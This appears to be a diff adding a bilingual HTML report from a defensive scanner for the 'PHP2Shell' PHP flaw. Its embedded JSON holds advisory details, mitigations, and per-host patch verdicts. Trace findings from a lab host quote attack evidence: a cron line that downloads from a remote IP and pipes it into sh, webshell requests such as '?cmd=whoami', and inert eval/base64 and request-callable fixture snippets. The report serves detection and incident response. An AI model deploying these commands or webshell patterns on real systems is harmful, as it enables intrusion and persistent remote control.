+        <thead><tr><th><span lang="en">Web root</span><span lang="zh">网站根目录</span></th><th><span lang="en">Files</span><span lang="zh">文件数</span></th><th><span lang="en">Found via</span><span lang="zh">来源</span></th></tr></thead>
+        <tbody><tr><td class="mono">/var/www</td><td class="mono">9</td><td class="bx-faint">default</td></tr></tbody>
+      </table></div>
+    </div>
+    
+  </section>
+  
+
+  <section class="r-method bx-card bx-card-body">
+    <div class="bx-eyebrow"><span lang="en">How to read this report</span><span lang="zh">如何阅读本报告</span></div>
+    <p lang="en">Bastion only reads files and process metadata; it changed nothing on this machine. <b>Fixed</b> means a fixed upstream version, a vendor package at or above the vendor's fixed version, a package changelog naming the CVE, or code that only the fix introduces. <b>Likely vulnerable</b> means a build Bastion cannot prove patched (for example an end-of-life branch or a package whose changelog is silent). <b>Unknown</b> means there was not enough information — ask the vendor. Trace findings are indicators, not proof; a clean trace does not prove a clean system.</p>
+    <p lang="zh">Bastion 只读取文件和进程信息，没有改动这台机器上的任何东西。<b>已修复</b>表示：上游版本已修复、发行版软件包不低于官方给出的修复版本、软件包变更日志中写明了该 CVE，或者二进制中含有只有补丁才会引入的代码。<b>很可能存在漏洞</b>表示 Bastion 无法证明它已打补丁（例如已停止维护的分支，或变更日志中没有任何记录的软件包）。<b>无法判断</b>表示信息不足，请向供应商确认。溯源结果只是线索而非定论；没有发现问题也不代表系统一定干净。</p>
+  </section>
+</main>
+
+<footer class="bx-wrap r-foot mono bx-faint">
+  <span>bastion dev · bastion.scan/v1 · bastion.trace/v1</span>
+  <span><span lang="en">Contains host details — share with care.</span><span lang="zh">包含主机细节，请谨慎分享。</span></span>
+</footer>
+
+<script type="application/json" id="bastion-data">{"generated":"2026-10-22T07:12:07.72401119Z","scan":{"schema":"bastion.scan/v1","tool":"dev","host":{"hostname":"vm","os":{"id":"ubuntu","id_like":["debian"],"version_id":"24.04","codename":"noble","pretty_name":"Ubuntu 24.04.5 LTS"},"kernel":"6.18.44-fc-v140","root":true},"started_at":"2026-10-22T07:12:07.509704006Z","duration_ms":186,"advisories":[{"schema":"bastion.advisory/v1","id":"PHP2SHELL-2026","name":"PHP2Shell","product":"php","published":"2026-10-21","severity":"critical","cvss":{"version":"4.0","score":9.2,"vector":"CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"},"aliases":["CVE-2026-109618","CVE-2026-109619","GHSA-w8hw-w9fx-j79w","GHSA-6wmf-4rv5-p3rp"],"vulnerabilities":[{"cve":"CVE-2026-109618","ghsa":"GHSA-w8hw-w9fx-j79w","title":{"en":"RCE via OOM corruption","zh":"内存耗尽（OOM）导致的状态损坏与远程代码执行"},"weaknesses":["CWE-416","CWE-755","CWE-824","CWE-1325","CWE-1419"],"url":"https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w"},{"cve":"CVE-2026-109619","ghsa":"GHSA-6wmf-4rv5-p3rp","title":{"en":"RCE via stale global state","zh":"残留全局状态导致的释放后使用与远程代码执行"},"weaknesses":["CWE-416","CWE-755","CWE-824","CWE-1325","CWE-1419"],"url":"https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp"}],"summary":{"en":"Two memory-safety flaws in the PHP engine let an unauthenticated HTTP request corrupt request state (through out-of-memory bailouts) or reuse freed global state in a later request on the same worker, leading to remote code execution as the web worker account. Apache mod_php is confirmed exploitable; PHP-FPM, FrankenPHP and LiteSpeed are considered likely susceptible.","zh":"PHP 引擎中的两个内存安全缺陷：未授权的 HTTP 请求可以借助内存耗尽时的异常退出破坏请求状态，或让同一工作进程的后续请求复用已释放的全局状态，最终以 Web 进程账号的权限执行任意代码。Apache mod_php 已被证实可利用，PHP-FPM、FrankenPHP 和 LiteSpeed 被认为同样可能受影响。"},"sapi_risk":{"apache2handler":{"level":"confirmed","en":"Exploit demonstrated against mod_php: the request can trigger the bug before any application code runs.","zh":"已在 mod_php 上演示利用：请求在任何应用代码执行之前即可触发漏洞。"},"cgi":{"level":"likely","en":"Serves web requests; treat as exposed.","zh":"直接处理 Web 请求，应视为暴露面。"},"cli":{"level":"low","en":"The CLI binary does not serve HTTP itself, but it usually shares a build with the web SAPIs on the same host.","zh":"CLI 本身不处理 HTTP 请求，但通常与同机的 Web SAPI 来自同一构建。"},"fpm":{"level":"likely","en":"Likely susceptible per source analysis; the session upload progress path was validated against PHP-FPM.","zh":"源码分析认为可能受影响；会话上传进度路径已在 PHP-FPM 上验证。"},"litespeed":{"level":"likely","en":"Considered likely susceptible (LSAPI), not validated.","zh":"被认为可能受影响（LSAPI），尚未验证。"}},"branches":[{"branch":"8.6","fixed":"8.6.0RC4","status":"prerelease","note":{"en":"8.6.0RC4 includes the fixes; earlier 8.6 builds are affected.","zh":"8.6.0RC4 已包含修复，更早的 8.6 构建受影响。"}},{"branch":"8.5","fixed":"8.5.12","status":"supported"},{"branch":"8.4","fixed":"8.4.27","status":"supported"},{"branch":"8.3","fixed":"8.3.36","status":"supported"},{"branch":"8.2","fixed":"8.2.35","status":"supported","note":{"en":"PHP 8.2 reaches end of life on 31 December 2026.","zh":"PHP 8.2 将于 2026 年 12 月 31 日结束生命周期。"}},{"branch":"8.1","status":"eol","source_backport":"https://github.com/php/php-src/tree/PHP-8.1-CVE-2026-109618-109619"},{"branch":"8.0","status":"eol","source_backport":"https://github.com/php/php-src/tree/PHP-8.0-CVE-2026-109618-109619"},{"branch":"7.4","status":"eol","source_backport":"https://github.com/php/php-src/tree/PHP-7.4-CVE-2026-109618-109619"}],"older_branches":"affected","newer_branches":"fixed","vendor_fixes":[{"distro":"ubuntu","release":"26.10","package":"php8.5","fixed":"8.5.9-0ubuntu2.1","format":"dpkg","advisory":"USN-8948-1","url":"https://ubuntu.com/security/CVE-2026-109618"},{"distro":"ubuntu","release":"26.04","package":"php8.5","fixed":"8.5.4-0ubuntu1.5","format":"dpkg","advisory":"USN-8948-1","url":"https://ubuntu.com/security/CVE-2026-109618"},{"distro":"ubuntu","release":"24.04","package":"php8.3","fixed":"8.3.6-0ubuntu0.24.04.13","format":"dpkg","advisory":"USN-8948-1","url":"https://ubuntu.com/security/CVE-2026-109618"},{"distro":"ubuntu","release":"22.04","package":"php8.1","fixed":"8.1.2-1ubuntu2.28","format":"dpkg","advisory":"USN-8948-1","url":"https://ubuntu.com/security/CVE-2026-109618"},{"distro":"ubuntu","release":"20.04","package":"php7.4","fixed":"7.4.3-4ubuntu2.29+esm5","format":"dpkg","advisory":"USN-8948-2","channel":"Ubuntu Pro (ESM)","url":"https://ubuntu.com/security/CVE-2026-109618"},{"distro":"ubuntu","release":"18.04","package":"php7.2","fixed":"7.2.24-0ubuntu0.18.04.17+esm14","format":"dpkg","advisory":"USN-8948-2","channel":"Ubuntu Pro (ESM)","url":"https://ubuntu.com/security/CVE-2026-109618"},{"distro":"ubuntu","release":"16.04","package":"php7.0","fixed":"7.0.33-0ubuntu0.16.04.16+esm22","format":"dpkg","advisory":"USN-8948-2","channel":"Ubuntu Pro Legacy","url":"https://ubuntu.com/security/CVE-2026-109618"},{"distro":"ubuntu","release":"14.04","package":"php5","fixed":"5.5.9+dfsg-1ubuntu4.29+esm18","format":"dpkg","advisory":"USN-8948-2","channel":"Ubuntu Pro Legacy","url":"https://ubuntu.com/security/CVE-2026-109618"},{"distro":"debian","release":"13","package":"php8.4","fixed":"8.4.27-1~deb13u1","format":"dpkg","advisory":"DSA-6574-1","url":"https://security-tracker.debian.org/tracker/CVE-2026-109618"},{"distro":"debian","release":"12","package":"php8.2","fixed":"8.2.35-1~deb12u1","format":"dpkg","advisory":"DLA-4848-1","url":"https://security-tracker.debian.org/tracker/CVE-2026-109618"}],"changelog_markers":["CVE-2026-109618","CVE-2026-109619","GHSA-w8hw-w9fx-j79w","GHSA-6wmf-4rv5-p3rp"],"fingerprints":[{"kind":"binary-string","value":"Hard memory limit of","indicates":"fixed","min_branch":"8.2","note":{"en":"The fix replaces longjmp-based OOM handling with a soft limit plus a hard limit; the 'Hard memory limit of %zu bytes exhausted' message only exists in patched builds (php-src 8.2.35+ and vendor ports of that patch). The minimal 7.4/8.0/8.1 source backports do not add it, so its absence proves nothing.","zh":"修复把基于 longjmp 的 OOM 处理换成了软上限加硬上限；只有打过补丁的构建（php-src 8.2.35 及以上，以及移植了该补丁的发行版构建）才包含 “Hard memory limit of %zu bytes exhausted” 这条消息。7.4/8.0/8.1 的最小源码回溯不会加入它，因此找不到它并不能说明任何问题。"}}],"mitigations":[{"en":"Update to 8.5.12, 8.4.27, 8.3.36 or 8.2.35 (or your vendor's patched package). This is the only complete fix.","zh":"升级到 8.5.12、8.4.27、8.3.36 或 8.2.35（或发行版的已修复包），这是唯一完整的修复。"},{"en":"Restart every PHP worker after updating (php-fpm, Apache, LiteSpeed). Updated files on disk do nothing for workers that are still running the old code.","zh":"升级后重启所有 PHP 工作进程（php-fpm、Apache、LiteSpeed）。磁盘上的文件更新了，但仍在运行旧代码的进程并不会因此变安全。"},{"en":"If you cannot update yet: set session.upload_progress.enabled=0 in php.ini or the FPM pool (not via ini_set or .user.ini) and restart workers.","zh":"暂时无法升级时：在 php.ini 或 FPM 池配置中设置 session.upload_progress.enabled=0（不要用 ini_set 或 .user.ini），然后重启进程。"},{"en":"On PHP 8.5 that cannot be updated, set fatal_error_backtraces=0 and restart workers.","zh":"无法升级的 PHP 8.5：设置 fatal_error_backtraces=0 并重启进程。"},{"en":"Reduce exposure: enforce memory_limit=-1 administratively (php_admin_value), keep post_max_size low (8M without uploads, 32M with), and cap request size, part count and header count at the web server or proxy. These narrow known paths but do not make an installation safe.","zh":"降低暴露面：以管理员方式强制 memory_limit=-1（php_admin_value），降低 post_max_size（无上传 8M、有上传 32M），并在 Web 服务器或代理层限制请求体大小、multipart 段数和请求头数量。这些措施只能收窄已知路径，不能让系统变安全。"},{"en":"Do not use RLIMIT_AS / RLIMIT_DATA as a memory boundary; they can cause the vulnerable allocation failure. Use cgroup/container limits instead.","zh":"不要用 RLIMIT_AS / RLIMIT_DATA 作为内存边界，它们反而可能触发有漏洞的分配失败路径；请改用 cgroup 或容器内存限制。"}],"references":[{"title":"php.net security advisory (21 Oct 2026)","url":"https://www.php.net/"},{"title":"GHSA-w8hw-w9fx-j79w","url":"https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w"},{"title":"GHSA-6wmf-4rv5-p3rp","url":"https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp"},{"title":"Ubuntu CVE tracker","url":"https://ubuntu.com/security/CVE-2026-109618"},{"title":"Debian security tracker","url":"https://security-tracker.debian.org/tracker/CVE-2026-109618"},{"title":"Red Hat RHSB-2026-013","url":"https://access.redhat.com/security/vulnerabilities/RHSB-2026-013"}],"notes":{"en":"The official advisories list every release below 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 as affected. Branches 8.1 and older receive no official release; the PHP security team published minimal source backport branches for 7.4, 8.0 and 8.1, which do not change the version string. Vendors (Ubuntu also ships fixes for 5.5, 7.0, 7.2 and 7.4 through Ubuntu Pro) backport fixes without bumping the upstream version, which is why Bastion checks package versions and changelogs.","zh":"官方公告将 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 以下的所有版本列为受影响。8.1 及更早的分支不会再有官方发布；PHP 安全团队为 7.4、8.0、8.1 提供了最小化的源码回溯分支，但不会改变版本号。发行版（Ubuntu 还通过 Ubuntu Pro 为 5.5、7.0、7.2、7.4 提供修复）会在不提升上游版本号的情况下回溯补丁，这正是 Bastion 要检查软件包版本和变更日志的原因。"}}],"targets":[{"kind":"host","name":"vm","os":{"id":"ubuntu","id_like":["debian"],"version_id":"24.04","codename":"noble","pretty_name":"Ubuntu 24.04.5 LTS"},"access":"filesystem"},{"kind":"container","name":"bx-ubuntu-apache","id":"b865278523fe","image":"ubuntu:24.04","runtime":"docker","os":{"id":"ubuntu","id_like":["debian"],"version_id":"24.04","codename":"noble","pretty_name":"Ubuntu 24.04.5 LTS"},"access":"filesystem"},{"kind":"container","name":"bx-cli-new","id":"d228e476c4b3","image":"php:8.3-cli","runtime":"docker","os":{"id":"debian","version_id":"13","codename":"trixie","pretty_name":"Debian GNU/Linux 13 (trixie)"},"access":"filesystem"},{"kind":"container","name":"bx-fpm-old","id":"32067927d602","image":"php:8.3.35-fpm","runtime":"docker","os":{"id":"debian","version_id":"13","codename":"trixie","pretty_name":"Debian GNU/Linux 13 (trixie)"},"access":"filesystem"}],"instances":[{"id":"4c01570c8f","target":"bx-fpm-old","target_kind":"container","image":"php:8.3.35-fpm","path":"/usr/local/bin/php","sapi":"cli","environment":"Docker official image","version":"8.3.35","version_source":"binary","os":{"id":"debian","version_id":"13","codename":"trixie","pretty_name":"Debian GNU/Linux 13 (trixie)"},"assessments":[{"advisory":"PHP2SHELL-2026","status":"vulnerable","confidence":"high","reason":"PHP 8.3.35 is below 8.3.36","fixed_in":"8.3.36","evidence":[{"kind":"version","verdict":"vulnerable","detail":"PHP 8.3.35 is below the fixed release 8.3.36"}]}]},{"id":"f46c9de16b","target":"bx-fpm-old","target_kind":"container","image":"php:8.3.35-fpm","path":"/usr/local/sbin/php-fpm","sapi":"fpm","environment":"Docker official image","version":"8.3.35","version_source":"binary","pids":[11661,11698,11699],"os":{"id":"debian","version_id":"13","codename":"trixie","pretty_name":"Debian GNU/Linux 13 (trixie)"},"assessments":[{"advisory":"PHP2SHELL-2026","status":"vulnerable","confidence":"high","reason":"PHP 8.3.35 is below 8.3.36","fixed_in":"8.3.36","evidence":[{"kind":"version","verdict":"vulnerable","detail":"PHP 8.3.35 is below the fixed release 8.3.36"}]}]},{"id":"69a3ce9af3","target":"vm","target_kind":"host","path":"/usr/bin/php8.3","aliases":["/bin/php","/bin/php8.3","/usr/bin/php"],"sapi":"cli","environment":"System package (apt)","version":"8.3.6","version_source":"binary","package":{"manager":"dpkg","name":"php8.3-cli","version":"8.3.6-0ubuntu0.24.04.12","source":"php8.3"},"changelog":"/usr/share/doc/php8.3-cli/changelog.Debian.gz","os":{"id":"ubuntu","id_like":["debian"],"version_id":"24.04","codename":"noble","pretty_name":"Ubuntu 24.04.5 LTS"},"assessments":[{"advisory":"PHP2SHELL-2026","status":"vulnerable","confidence":"high","reason":"package 8.3.6-0ubuntu0.24.04.12 is older than the vendor fix 8.3.6-0ubuntu0.24.04.13","fixed_in":"8.3.6-0ubuntu0.24.04.13","vendor_fix":{"distro":"ubuntu","release":"24.04","package":"php8.3","fixed":"8.3.6-0ubuntu0.24.04.13","format":"dpkg","advisory":"USN-8948-1","url":"https://ubuntu.com/security/CVE-2026-109618"},"evidence":[{"kind":"version","verdict":"neutral","detail":"PHP 8.3.6 is below the fixed release 8.3.36, but distribution packages often carry backports"},{"kind":"vendor","verdict":"vulnerable","detail":"php8.3-cli 8.3.6-0ubuntu0.24.04.12 \u003c 8.3.6-0ubuntu0.24.04.13 (USN-8948-1, ubuntu 24.04)"}]}]},{"id":"47ab02b992","target":"bx-cli-new","target_kind":"container","image":"php:8.3-cli","path":"/usr/local/bin/php","sapi":"cli","environment":"Docker official image","version":"8.3.36","version_source":"binary","fingerprints":["Hard memory limit of"],"os":{"id":"debian","version_id":"13","codename":"trixie","pretty_name":"Debian GNU/Linux 13 (trixie)"},"assessments":[{"advisory":"PHP2SHELL-2026","status":"fixed","confidence":"high","reason":"running 8.3.36, fixed in 8.3.36","fixed_in":"8.3.36","evidence":[{"kind":"version","verdict":"fixed","detail":"PHP 8.3.36 is at or above the fixed release 8.3.36"}]}]},{"id":"2085faaf79","target":"bx-cli-new","target_kind":"container","image":"php:8.3-cli","path":"/usr/local/bin/php-cgi","sapi":"cgi","environment":"Docker official image","version":"8.3.36","version_source":"binary","fingerprints":["Hard memory limit of"],"os":{"id":"debian","version_id":"13","codename":"trixie","pretty_name":"Debian GNU/Linux 13 (trixie)"},"assessments":[{"advisory":"PHP2SHELL-2026","status":"fixed","confidence":"high","reason":"running 8.3.36, fixed in 8.3.36","fixed_in":"8.3.36","evidence":[{"kind":"version","verdict":"fixed","detail":"PHP 8.3.36 is at or above the fixed release 8.3.36"}]}]},{"id":"16eb53823b","target":"bx-cli-new","target_kind":"container","image":"php:8.3-cli","path":"/usr/local/bin/php83","sapi":"cli","environment":"Docker official image","version":"8.3.36","version_source":"binary","fingerprints":["Hard memory limit of"],"pids":[21230],"stale":true,"notes":["binary was replaced on disk; this process still runs the old build — restart it"],"os":{"id":"debian","version_id":"13","codename":"trixie","pretty_name":"Debian GNU/Linux 13 (trixie)"},"assessments":[{"advisory":"PHP2SHELL-2026","status":"fixed","confidence":"high","reason":"running 8.3.36, fixed in 8.3.36","fixed_in":"8.3.36","evidence":[{"kind":"version","verdict":"fixed","detail":"PHP 8.3.36 is at or above the fixed release 8.3.36"}]}]},{"id":"c3d4925a59","target":"bx-ubuntu-apache","target_kind":"container","image":"ubuntu:24.04","path":"/usr/bin/php8.3","aliases":["/usr/bin/php"],"sapi":"cli","environment":"System package (apt)","version":"8.3.6","version_source":"binary","package":{"manager":"dpkg","name":"php8.3-cli","version":"8.3.6-0ubuntu0.24.04.13","source":"php8.3"},"changelog":"/usr/share/doc/php8.3-cli/changelog.Debian.gz","fingerprints":["Hard memory limit of"],"os":{"id":"ubuntu","id_like":["debian"],"version_id":"24.04","codename":"noble","pretty_name":"Ubuntu 24.04.5 LTS"},"assessments":[{"advisory":"PHP2SHELL-2026","status":"fixed","confidence":"high","reason":"vendor backport 8.3.6-0ubuntu0.24.04.13 in USN-8948-1","fixed_in":"8.3.6-0ubuntu0.24.04.13","vendor_fix":{"distro":"ubuntu","release":"24.04","package":"php8.3","fixed":"8.3.6-0ubuntu0.24.04.13","format":"dpkg","advisory":"USN-8948-1","url":"https://ubuntu.com/security/CVE-2026-109618"},"evidence":[{"kind":"version","verdict":"neutral","detail":"PHP 8.3.6 is below the fixed release 8.3.36, but distribution packages often carry backports"},{"kind":"vendor","verdict":"fixed","detail":"php8.3-cli 8.3.6-0ubuntu0.24.04.13 ≥ 8.3.6-0ubuntu0.24.04.13 (USN-8948-1, ubuntu 24.04)"}]}]},{"id":"453c5e0ad0","target":"bx-ubuntu-apache","target_kind":"container","image":"ubuntu:24.04","path":"/usr/lib/apache2/modules/libphp8.3.so","sapi":"apache2handler","environment":"System package (apt)","version":"8.3.6","version_source":"binary","package":{"manager":"dpkg","name":"libapache2-mod-php8.3","version":"8.3.6-0ubuntu0.24.04.13","source":"php8.3"},"changelog":"/usr/share/doc/libapache2-mod-php8.3/changelog.Debian.gz","fingerprints":["Hard memory limit of"],"pids":[20975,20976,20977,20978,20979,20980],"os":{"id":"ubuntu","id_like":["debian"],"version_id":"24.04","codename":"noble","pretty_name":"Ubuntu 24.04.5 LTS"},"assessments":[{"advisory":"PHP2SHELL-2026","status":"fixed","confidence":"high","reason":"vendor backport 8.3.6-0ubuntu0.24.04.13 in USN-8948-1","fixed_in":"8.3.6-0ubuntu0.24.04.13","vendor_fix":{"distro":"ubuntu","release":"24.04","package":"php8.3","fixed":"8.3.6-0ubuntu0.24.04.13","format":"dpkg","advisory":"USN-8948-1","url":"https://ubuntu.com/security/CVE-2026-109618"},"evidence":[{"kind":"version","verdict":"neutral","detail":"PHP 8.3.6 is below the fixed release 8.3.36, but distribution packages often carry backports"},{"kind":"vendor","verdict":"fixed","detail":"libapache2-mod-php8.3 8.3.6-0ubuntu0.24.04.13 ≥ 8.3.6-0ubuntu0.24.04.13 (USN-8948-1, ubuntu 24.04)"}]}]}]},"trace":{"schema":"bastion.trace/v1","tool":"dev","hostname":"/tmp/bastion-lab","os":"Debian GNU/Linux 12 (bookworm)","started_at":"2026-10-22T07:12:07.711425266Z","duration_ms":2,"since":"2016-10-24T07:12:07.709941269Z","verdict":"compromised","webroots":[{"path":"/var/www","source":"default","files":9}],"findings":[{"id":"F001","rule":"log.flagged-file-access","category":"log","severity":"high","title":{"en":"Requests to a flagged file","zh":"有请求访问了被标记的文件"},"why":{"en":"The file /var/www/shop/public/wp-content/uploads/2026/10/thumb.php was flagged by the file scan and was requested over HTTP.","zh":"文件扫描标记的 /var/www/shop/public/wp-content/uploads/2026/10/thumb.php 曾被 HTTP 请求访问。"},"path":"/var/log/nginx/shop.access.log","snippet":"198.51.100.23 - - [21/Oct/2026:16:04:20 +0000] \"POST /wp-content/uploads/2026/10/thumb.php HTTP/1.1\" 200 31 \"-\" \"Mozilla/5.0\"","time":"2026-10-22T02:09:41Z","count":4,"details":["file /var/www/shop/public/wp-content/uploads/2026/10/thumb.php","file /var/www/shop/public/lib/compat.php","first 2026-10-21T16:04:20Z, last 2026-10-22T02:09:41Z","top clients: 198.51.100.23×4","status codes: 200×4","198.51.100.23 - - [21/Oct/2026:16:04:20 +0000] \"POST /wp-content/uploads/2026/10/thumb.php HTTP/1.1\" 200 31 \"-\" \"Mozilla/5.0\"","198.51.100.23 - - [21/Oct/2026:16:05:12 +0000] \"POST /lib/compat.php HTTP/1.1\" 200 8 \"-\" \"Mozilla/5.0\"","198.51.100.23 - - [21/Oct/2026:16:07:55 +0000] \"GET /lib/compat.php?cmd=whoami HTTP/1.1\" 200 9 \"-\" \"curl/8.5.0\""]},{"id":"F002","rule":"log.post-upload-php","category":"log","severity":"high","title":{"en":"Successful POST to a PHP file in an upload directory","zh":"成功 POST 到上传目录中的 PHP 文件"},"why":{"en":"Legitimate applications do not execute PHP from upload directories.","zh":"正常应用不会执行上传目录中的 PHP 文件。"},"path":"/var/log/nginx/shop.access.log","snippet":"198.51.100.23 - - [21/Oct/2026:16:04:20 +0000] \"POST /wp-content/uploads/2026/10/thumb.php HTTP/1.1\" 200 31 \"-\" \"Mozilla/5.0\"","time":"2026-10-21T16:04:20Z","count":1,"details":["first 2026-10-21T16:04:20Z, last 2026-10-21T16:04:20Z","top clients: 198.51.100.23×1","status codes: 200×1","198.51.100.23 - - [21/Oct/2026:16:04:20 +0000] \"POST /wp-content/uploads/2026/10/thumb.php HTTP/1.1\" 200 31 \"-\" \"Mozilla/5.0\""]},{"id":"F003","rule":"persist.cron","category":"persistence","severity":"high","title":{"en":"Suspicious scheduled task","zh":"可疑的计划任务"},"why":{"en":"Line downloads and pipes into a shell.","zh":"该行下载内容并直接交给 Shell 执行。"},"path":"/var/spool/cron/crontabs/www-data","line":1,"snippet":"*/10 * * * * curl -fsSL http://198.51.100.23/u | sh","time":"2026-10-21T16:09:30Z"},{"id":"F004","rule":"config.auto-prepend","category":"config","severity":"high","title":{"en":"PHP auto_prepend/append_file set in .user.ini","zh":".user.ini 中设置了 auto_prepend/append_file"},"why":{"en":"Every request on this directory first runs /var/www/shop/public/img/.cache.png. A favourite way to keep a backdoor loaded.","zh":"该目录下的每个请求都会先执行 /var/www/shop/public/img/.cache.png，这是常见的后门驻留方式。"},"path":"/var/www/shop/public/.user.ini","line":1,"snippet":"auto_prepend_file = /var/www/shop/public/img/.cache.png ","time":"2026-10-21T16:06:15Z"},{"id":"F005","rule":"php.request-callable","category":"file","severity":"high","title":{"en":"Function name taken from the request","zh":"函数名直接取自请求参数"},"why":{"en":"$_POST['x']($_POST['y']) lets the attacker call any function.","zh":"$_POST['x']($_POST['y']) 这种写法允许攻击者调用任意函数。"},"path":"/var/www/shop/public/lib/compat.php","line":1,"snippet":"… demo fixture — inert */ if (false) { $_POST['k']($_POST['v']); } ","time":"2026-10-21T16:05:02Z","details":["requested over HTTP (see /var/log/nginx/shop.access.log)"],"rules":["php.request-callable"]},{"id":"F006","rule":"php.eval-decoded","category":"file","severity":"high","title":{"en":"eval/assert of decoded data","zh":"对解码后的数据执行 eval/assert"},"why":{"en":"Executing decoded strings is the classic packer used by webshells to hide their payload.","zh":"执行解码后的字符串是 Webshell 隐藏载荷最常见的手法。"},"path":"/var/www/shop/public/wp-content/uploads/2026/10/thumb.php","line":1,"snippet":"… demo fixture — inert */ if (false) { eval(base64_decode('ZGVtbw==')); } ","time":"2026-10-21T16:04:11Z","details":["located in an upload/cache directory","requested over HTTP (see /var/log/nginx/shop.access.log)"],"rules":["php.eval-decoded"]},{"id":"F007","rule":"log.command-param","category":"log","severity":"medium","title":{"en":"Shell commands passed as request parameters","zh":"请求参数中携带 Shell 命令"},"why":{"en":"Typical of interacting with a webshell.","zh":"这是操作 Webshell 的典型特征。"},"path":"/var/log/nginx/shop.access.log","snippet":"198.51.100.23 - - [21/Oct/2026:16:07:55 +0000] \"GET /lib/compat.php?cmd=whoami HTTP/1.1\" 200 9 \"-\" \"curl/8.5.0\"","time":"2026-10-21T16:07:55Z","count":1,"details":["first 2026-10-21T16:07:55Z, last 2026-10-21T16:07:55Z","top clients: 198.51.100.23×1","status codes: 200×1","198.51.100.23 - - [21/Oct/2026:16:07:55 +0000] \"GET /lib/compat.php?cmd=whoami HTTP/1.1\" 200 9 \"-\" \"curl/8.5.0\""]},{"id":"F008","rule":"log.early-oom","category":"log","severity":"medium","title":{"en":"Out-of-memory during request start-up","zh":"请求启动阶段发生内存耗尽"},"why":{"en":"'in Unknown on line 0' means memory ran out before any script ran — while PHP was parsing the request. That is the trigger condition of CVE-2026-109618.","zh":"“in Unknown on line 0”说明内存在任何脚本运行之前、PHP 解析请求时就已耗尽，这正是 CVE-2026-109618 的触发条件。"},"path":"/var/log/php8.2-fpm.log","snippet":"[21-Oct-2026 16:01:07] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0","time":"2026-10-21T16:01:07Z","count":1,"details":["first 2026-10-21T16:01:07Z, last 2026-10-21T16:01:07Z","[21-Oct-2026 16:01:07] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0"]},{"id":"F009","rule":"log.worker-crash","category":"log","severity":"medium","title":{"en":"PHP worker crashes (segfault / heap corruption)","zh":"PHP 工作进程崩溃（段错误或堆损坏）"},"why":{"en":"PHP2Shell is a memory-corruption bug; exploitation attempts often crash workers before they succeed. Crashes also happen for benign reasons — check timing against suspicious requests.","zh":"PHP2Shell 属于内存破坏漏洞，利用尝试在成功前常会让进程崩溃。崩溃也可能有无害的原因，请结合可疑请求的时间判断。"},"path":"/var/log/php8.2-fpm.log","snippet":"[21-Oct-2026 15:58:41] WARNING: [pool www] child 3812 exited on signal 11 (SIGSEGV) after 41.200713 seconds from start","time":"2026-10-21T16:03:09Z","count":3,"details":["first 2026-10-21T15:58:41Z, last 2026-10-21T16:03:09Z","[21-Oct-2026 15:58:41] WARNING: [pool www] child 3812 exited on signal 11 (SIGSEGV) after 41.200713 seconds from start","[21-Oct-2026 15:58:43] WARNING: [pool www] child 3820 exited on signal 11 (SIGSEGV) after 2.004112 seconds from start","[21-Oct-2026 16:03:09] WARNING: [pool www] child 3851 exited on signal 11 (SIGSEGV) after 0.912034 seconds from start"]},{"id":"F010","rule":"file.php-in-image","category":"file","severity":"medium","title":{"en":"PHP code hidden in an image file","zh":"图片文件中藏有 PHP 代码"},"why":{"en":"Polyglot images are used with include() or a handler override to run code.","zh":"这种“图片马”配合 include() 或处理器覆盖即可执行代码。"},"path":"/var/www/shop/public/img/.cache.png","line":3,"snippet":"·PNG  · \u003c?php /* demo fixture — inert */ ?\u003e","time":"2026-10-21T16:05:40Z"}],"timeline":[{"time":"2026-06-02T09:12:00Z","kind":"file","severity":"info","summary":"PHP file modified","path":"/var/www/shop/public/cart.php"},{"time":"2026-06-02T09:12:00Z","kind":"file","severity":"info","summary":"PHP file modified","path":"/var/www/shop/public/checkout.php"},{"time":"2026-06-02T09:12:00Z","kind":"file","severity":"info","summary":"PHP file modified","path":"/var/www/shop/public/index.php"},{"time":"2026-06-02T09:12:00Z","kind":"file","severity":"info","summary":"PHP file modified","path":"/var/www/shop/public/lib/db.php"},{"time":"2026-06-02T09:12:00Z","kind":"file","severity":"info","summary":"PHP file modified","path":"/var/www/shop/public/lib/session.php"},{"time":"2026-10-21T15:58:41Z","kind":"log","severity":"medium","summary":"PHP worker crashes (segfault / heap corruption) — first seen (3 total)","path":"/var/log/php8.2-fpm.log"},{"time":"2026-10-21T16:01:07Z","kind":"log","severity":"medium","summary":"Out-of-memory during request start-up — first seen (1 total)","path":"/var/log/php8.2-fpm.log"},{"time":"2026-10-21T16:03:09Z","kind":"log","severity":"medium","summary":"PHP worker crashes (segfault / heap corruption) — last seen","path":"/var/log/php8.2-fpm.log"},{"time":"2026-10-21T16:04:11Z","kind":"file","severity":"high","summary":"flagged file last modified: eval/assert of decoded data","path":"/var/www/shop/public/wp-content/uploads/2026/10/thumb.php"},{"time":"2026-10-21T16:04:11Z","kind":"file","severity":"info","summary":"PHP file modified","path":"/var/www/shop/public/wp-content/uploads/2026/10/thumb.php"},{"time":"2026-10-21T16:04:20Z","kind":"log","severity":"high","summary":"Requests to a flagged file — first seen (4 total)","path":"/var/log/nginx/shop.access.log"},{"time":"2026-10-21T16:04:20Z","kind":"log","severity":"high","summary":"Successful POST to a PHP file in an upload directory — first seen (1 total)","path":"/var/log/nginx/shop.access.log"},{"time":"2026-10-21T16:05:02Z","kind":"file","severity":"high","summary":"flagged file last modified: Function name taken from the request","path":"/var/www/shop/public/lib/compat.php"},{"time":"2026-10-21T16:05:02Z","kind":"file","severity":"info","summary":"PHP file modified","path":"/var/www/shop/public/lib/compat.php"},{"time":"2026-10-21T16:05:40Z","kind":"file","severity":"medium","summary":"flagged file last modified: PHP code hidden in an image file","path":"/var/www/shop/public/img/.cache.png"},{"time":"2026-10-21T16:06:15Z","kind":"file","severity":"high","summary":"flagged file last modified: PHP auto_prepend/append_file set in .user.ini","path":"/var/www/shop/public/.user.ini"},{"time":"2026-10-21T16:07:55Z","kind":"log","severity":"medium","summary":"Shell commands passed as request parameters — first seen (1 